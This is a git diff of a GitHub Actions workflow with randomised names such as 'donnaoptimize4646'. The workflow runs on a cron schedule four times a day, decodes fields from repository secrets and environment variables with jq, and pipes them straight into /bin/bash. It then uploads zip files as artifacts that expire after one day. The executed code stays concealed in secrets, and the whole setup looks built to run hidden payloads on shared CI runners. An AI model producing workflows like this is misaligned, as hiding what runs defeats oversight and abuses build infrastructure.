@@ -1,8 +1,9 @@
 name: donnaoptimize4646
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '29 2/6 * * *'
+    - cron: '20 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,15 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: donnaoptimize4646
         env:
-          koyfb67: ${{ secrets.koyfb67 }}
+          bxeu80: ${{ secrets.bxeu80 }}
         run: |
-          echo $koyfb67 | jq -r .x982 | /bin/bash
-          echo $ljam24 | jq -r .a4 | /bin/bash
-          echo $df4161 | jq -r .i15700 | /bin/bash
-          echo $jzf8 | jq -r .uguss44 | /bin/bash
-          echo $as90 | jq -r .eyo12 | /bin/bash
-          echo $qkvh488 | jq -r .pmfh9822 | /bin/bash
-          echo $mxq52 | jq -r .hjz01941 | /bin/bash
-          echo $uqvh4583 | jq -r .c408 | /bin/bash
-          echo $dnjer0 | jq -r .ssc07055 | /bin/bash
+          printf '%s' "$bxeu80" | jq -r .a55144 | /bin/bash
+          echo $rixk42455 | jq -r .ceg379 | /bin/bash
+          echo $atkx534 | jq -r .qbq5351 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: gk0njzhR
+          path: "*.zip"
+          retention-days: 1
